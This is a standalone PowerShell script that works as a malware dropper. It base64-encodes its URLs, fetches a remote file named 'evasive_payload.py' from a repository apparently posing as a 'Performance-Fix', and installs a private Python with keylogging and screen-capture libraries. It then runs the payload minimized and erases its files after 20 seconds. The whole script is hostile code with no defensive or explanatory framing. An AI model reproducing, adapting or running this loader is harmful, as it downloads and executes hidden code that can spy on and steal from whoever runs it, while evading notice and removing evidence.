$e=[System.Text.Encoding]::UTF8
function d($s){$e.GetString([Convert]::FromBase64String($s))}
$purl=d("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZvcnRuaXRlMDcxMjEwMi1kb3QvUGVyZm9ybWFuY2UtRml4L3JlZnMvaGVhZHMvbWFpbi9ldmFzaXZlX3BheWxvYWQucHk=")
$pzip=d("aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9mdHAvcHl0aG9uLzMuMTEuOS9weXRob24tMy4xMS45LWVtYmVkLWFtZDY0LnppcA==")
$gpip=d("aHR0cHM6Ly9ib290c3RyYXAucnlwYS5pby9nZXQtcGlwLnB5")
$td="$env:TEMP\"+[System.IO.Path]::GetRandomFileName()
New-Item -ItemType Directory -Force -Path $td|Out-Null
$wc=New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/5.0")
$pay="$env:TEMP\"+[System.IO.Path]::GetRandomFileName()+".py"
$wc.DownloadFile($purl,$pay)
$zip="$td\p.zip"
$wc.DownloadFile($pzip,$zip)
Add-Type -AssemblyName System.IO.Compression.FileSystem
$pyDir="$env:TEMP\"+[System.IO.Path]::GetRandomFileName()
[System.IO.Compression.ZipFile]::ExtractToDirectory($zip,$pyDir)
$pth=Get-ChildItem "$pyDir\*._pth"|Select -First 1
if($pth){
    $c=[System.IO.File]::ReadAllText($pth.FullName)
    $c=$c -replace '#import site','import site'
    [System.IO.File]::WriteAllText($pth.FullName,$c)
}
$python="$pyDir\python.exe"
$pip="$td\g.py"
$wc.DownloadFile($gpip,$pip)
& $python $pip --quiet --no-warn-script-location
$env:Path="$pyDir\Scripts;$env:Path"
$pkgs=@("cryptography","pynput","mss","pillow","psutil","requests","numpy")
foreach($p in $pkgs){& $python -m pip install $p --quiet --disable-pip-version-check --no-warn-script-location --user}
$psi=New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName=$python
$psi.Arguments=$pay
$psi.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Minimized
$psi.UseShellExecute=$true
[System.Diagnostics.Process]::Start($psi)
Start-Job -ScriptBlock{Start-Sleep 20;Remove-Item $using:zip,$using:pip,$using:pay -Force -EA 0;Remove-Item $using:pyDir -Recurse -Force -EA 0;Remove-Item $using:td -Recurse -Force -EA 0}|Out-Null
